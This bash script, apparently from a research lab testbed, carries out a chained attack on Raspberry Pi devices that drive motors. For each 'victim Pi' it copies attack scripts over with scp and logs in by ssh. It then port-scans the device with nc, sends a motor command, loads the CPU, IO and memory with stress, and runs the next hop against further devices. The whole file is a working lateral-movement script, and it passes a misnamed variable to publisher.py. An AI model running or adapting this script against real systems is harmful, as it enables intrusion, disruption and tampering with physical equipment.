#!/bin/bash
if [[ $# -lt 1 ]]; then
    echo 'Usage:'
    echo './scan_attack.sh command_code ip1 motor1 ip2 motor2 ip3 motor3 ...'
    echo 'Example:'
    echo './scan_attack.sh 5 10.42.0.187 1 10.42.0.189 2 10.42.0.220 3 10.42.0.203 4'
    exit 1
fi

arg_array=($@)
command=${arg_array[0]}
next_stepstone=${arg_array[1]}
next_motor_num=${arg_array[2]}
echo 'next_stepstone:' $next_stepstone
echo "next_motor_number:" $next_motor_num
unset 'arg_array[1]'
unset 'arg_array[2]'
next_arg_array=${arg_array[@]}
echo "next arguments: "$next_arg_array
echo "command:" $command

# copy the attack scripts into the victim Pi
scp pi.sh publisher.py pi@$next_stepstone:/home/pi/Workspace

ssh pi@$next_stepstone > /dev/null 2>&1 << eeooff
    cd Workspace
    chmod a+x pi.sh
    nc -zvn $next_stepstone 1-36000
    python3 publisher.py "$next_motor_number" "$command"
    stress --cpu 16 --io 4 --vm 2 --vm-bytes 128M --timeout 20s
    ./pi.sh $next_arg_array
    exit 0
eeooff

echo done!
exit 0
